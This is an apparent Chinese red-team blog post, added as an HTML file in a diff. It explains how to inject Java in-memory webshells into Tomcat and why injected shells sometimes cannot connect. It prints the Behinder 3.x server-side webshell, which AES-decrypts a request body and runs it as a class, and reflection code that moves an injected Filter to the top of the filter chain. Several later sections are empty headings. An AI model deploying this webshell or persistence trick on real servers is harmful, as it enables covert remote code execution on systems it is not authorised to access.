@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9bd5ca801b57208805a649cd598388a48ca56336">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>论如何优雅注入 Java 内存马 | BlogPapers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="论如何优雅注入 Java 内存马" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/2022/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%B3%A8%E5%85%A5%20Java%20%E5%86%85%E5%AD%98%E9%A9%AC.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2022/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%B3%A8%E5%85%A5%20Java%20%E5%86%85%E5%AD%98%E9%A9%AC.html" />
+<meta property="og:site_name" content="BlogPapers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="论如何优雅注入 Java 内存马" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"论如何优雅注入 Java 内存马","url":"http://0.0.0.0:4000/2022/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%B3%A8%E5%85%A5%20Java%20%E5%86%85%E5%AD%98%E9%A9%AC.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BlogPapers</h1>
+        </a>
+        <h2><a href="sumsec.me"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&pause=1000&color=FDFDFD&background=13797800&center=true&vCenter=true&width=435&lines=%F0%9F%91%8B%EF%BC%8C%E5%83%8F%E6%B8%85%E6%B0%B4%E4%B8%80%E8%88%AC%E6%B8%85%E6%BE%88%E9%80%8F%E6%98%8E" alt="SummerSec" /></a></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/SummerSec/BlogPapers" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="论如何优雅注入-java-内存马">论如何优雅注入 Java 内存马</h2>
+
+<h3 id="前言">前言</h3>
+
+<p>回顾之前做红队的时候，经常遇到很多内存马明明已经注入了，但无法连接上。同时有些时候也会遇到内存马无法注入，当然这里不考虑 RASP 之类的防御机制。虽然我已经不是红队，但这些问题时常想起总是困恼着我，在这里我想尝试找一下这些问题的答案。</p>
+
+<p>在此之前无法连接的情况，通常会考虑注入一个静态路径或者是一个完全虚拟的路径，一般情况下是能成功绕过。但也有一些极端的情况，还是无法注入内存马，具体情况目前我也无法得知，只能进行猜测。</p>
+
+<hr />
+
+<h3 id="传统-java-内存马">传统 Java 内存马</h3>
+
+<p>下面是一段冰蝎3.x版本的服务端链接代码，如果要注入 <strong>Serlvet</strong> 内存马也就约等同于在内存中注入这段代码。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/behinder/shell2"</span><span class="o">)</span> <span class="c1">// behinder3.0</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">Shell2</span><span class="o">(</span><span class="nc">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">ServletResponse</span> <span class="n">response</span><span class="o">)</span>
+            <span class="kd">throws</span> <span class="nc">InvalidKeyException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">NoSuchPaddingException</span><span class="o">,</span> <span class="nc">NoSuchAlgorithmException</span><span class="o">,</span>
+            <span class="nc">IllegalBlockSizeException</span><span class="o">,</span> <span class="nc">BadPaddingException</span><span class="o">,</span> <span class="nc">InstantiationException</span><span class="o">,</span> <span class="nc">IllegalAccessException</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">k</span><span class="o">=</span><span class="s">"e45e329feb5d925b"</span><span class="o">;</span><span class="cm">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>
+        <span class="nc">Map</span> <span class="n">objMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+        <span class="nc">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="o">((</span><span class="nc">HttpServletRequest</span><span class="o">)</span> <span class="n">request</span><span class="o">).</span><span class="na">getSession</span><span class="o">();</span>
+        <span class="n">session</span><span class="o">.</span><span class="na">putValue</span><span class="o">(</span><span class="s">"u"</span><span class="o">,</span><span class="n">k</span><span class="o">);</span>
+        <span class="n">objMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"session"</span><span class="o">,</span> <span class="n">session</span><span class="o">);</span>
+        <span class="n">objMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"response"</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+        <span class="n">objMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"request"</span><span class="o">,</span> <span class="n">request</span><span class="o">);</span>
+        <span class="nc">Cipher</span> <span class="n">c</span><span class="o">=</span><span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES"</span><span class="o">);</span><span class="n">c</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span><span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="n">k</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span><span class="s">"AES"</span><span class="o">));</span>
+        <span class="k">new</span> <span class="nf">U</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">()).</span><span class="na">g</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="k">new</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getReader</span><span class="o">().</span><span class="na">readLine</span><span class="o">()))).</span><span class="na">newInstance</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">objMap</span><span class="o">);</span>
+    <span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>如果要注册 Filter 也就是在 doFilter 方法中增加内存马的逻辑，无论是 Serlvet 还是 Filter、Listener 内存马，本质上都是动态注册。</p>
+
+<p>理论上传统内存马的优先级是 <strong>Listener &gt; Filter &gt; Serlvet</strong>，但正常情况下一个干净的 Java Web 的容器应该是不存在任何 Listener （这里可能不是很严谨，但至少Tomcat是没有，特殊情况除外）。并且由于 Listener 本身的特点，会很大干扰业务的正常运行，正常情况下还是不要考虑注入 Listener 内存马。</p>
+
+<p>那么我们注入内存马的优先级应该变为了 <strong>Filter &gt; Serlvet</strong>，注入 Serlvet 内存马得考虑原来服务中可能存在 Filter 的，得找一个默认不会进行拦截的路径进行注入。</p>
+
+<p>简单举一个例子，我首先在我的服务代码中注册了一个 Filter ，只要请求路径中不含有 favicon 才会放行请求。</p>
+
+<p><img src="https://img.sumsec.me/202211/202211021707966.png" alt="image-20221102170753797" /></p>
+
+<p><img src="https://img.sumsec.me/202211/202211021708701.png" alt="image-20221102170839653" /></p>
+
+<p>如果此时我们注入一个 Serlvet 内存马，路径为 <strong>/favicondemo.ico</strong> 内存马，我们是无法连接的。</p>
+
+<p><img src="https://img.sumsec.me/202211/202211021711154.png" alt="image-20221102171117109" /></p>
+
+<p><img src="https://img.sumsec.me/202211/202211021711939.png" alt="image-20221102171135904" /></p>
+
+<p><img src="https://img.sumsec.me/202211/202211021725775.png" alt="image-20221102172528685" /></p>
+
+<p>分析至此，那么最好的选择是注入 Filter 类型内存马。因为即使正常业务中存在 Listener 其目的也不会影响后续的 Filter 执行（理论上应如此）。</p>
+
+<hr />
+
+<h3 id="无法连接">无法连接？</h3>
+
+<p>目前为了注入 Filter 之后能连接上，会将注入的内存马得执行顺序放在第一位，注入成功之后就理论不会存在连接不上的情况，当然排除有 RASP 之类的存在。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="nc">Class</span> <span class="n">filterMap</span><span class="o">;</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">filterMap</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.apache.tomcat.util.descriptor.web.FilterMap"</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">var21</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">filterMap</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.apache.catalina.deploy.FilterMap"</span><span class="o">);</span>
+                <span class="o">}</span>
+
+                <span class="nc">Method</span> <span class="n">findFilterMaps</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"findFilterMaps"</span><span class="o">);</span>
+                <span class="nc">Object</span><span class="o">[]</span> <span class="n">filterMaps</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])((</span><span class="nc">Object</span><span class="o">[])</span><span class="n">findFilterMaps</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">standardContext</span><span class="o">));</span>
+
+                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">filterMaps</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="nc">Object</span> <span class="n">filterMapObj</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+                    <span class="n">findFilterMaps</span> <span class="o">=</span> <span class="n">filterMap</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getFilterName"</span><span class="o">);</span>
+                    <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">findFilterMaps</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">filterMapObj</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">name</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">filterName</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+                        <span class="n">filterMaps</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">filterMapObj</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+</code></pre></div></div>
+
+<p>为什么无法连接呢？我在测试的时候发现会存在动态注册的 Filter 内存马顺序会被移动。详情如下，首先我利用工具注册了一个 Pattern 为 <strong>/favicondemo.ico</strong> 的内存马。之后我再次注册一个 Pattern 为 <strong>/favicondemo1.ico</strong> 的内存马，通过扫描 Filter 发现  Pattern 为 <strong>/favicondemo.ico</strong> 的内存马原来的 ID 为 1，现在变为了 7。</p>
+
+<p><img src="https://img.sumsec.me/202211/202211031132339.png" alt="image-20221103113221051" /></p>
+
+<p><img src="https://img.sumsec.me/202211/202211031137866.png" alt="image-20221103113709759" /></p>
+
+<p>很明显的可以看到，第一次注册的 Pattern 为 <strong>/favicondemo.ico</strong> 的执行顺序都在服务代码注册<strong>com.example.shirovul.filter.WebFilter</strong> 的下面了，通过这个现象不难<strong>推测</strong>哪些无法连接的内存马是不是在无形之中执行顺序被改变了呢？</p>
+
+<hr />
+
+<h3 id="新型-ws-内存马">新型 WS 内存马</h3>
+
+<hr />
+
+<h3 id="agent-内存马">Agent 内存马</h3>
+
+<hr />
+
+<h3 id="总结">总结</h3>
+
+<hr />
+
+<h3 id="参考">参考</h3>
+
+<p>https://xz.aliyun.com/t/11640</p>
+
+<p>https://y4er.com/posts/javaagent-tomcat-memshell/</p>
+
+      </section>
+    </div>
+  </body>
+</html>
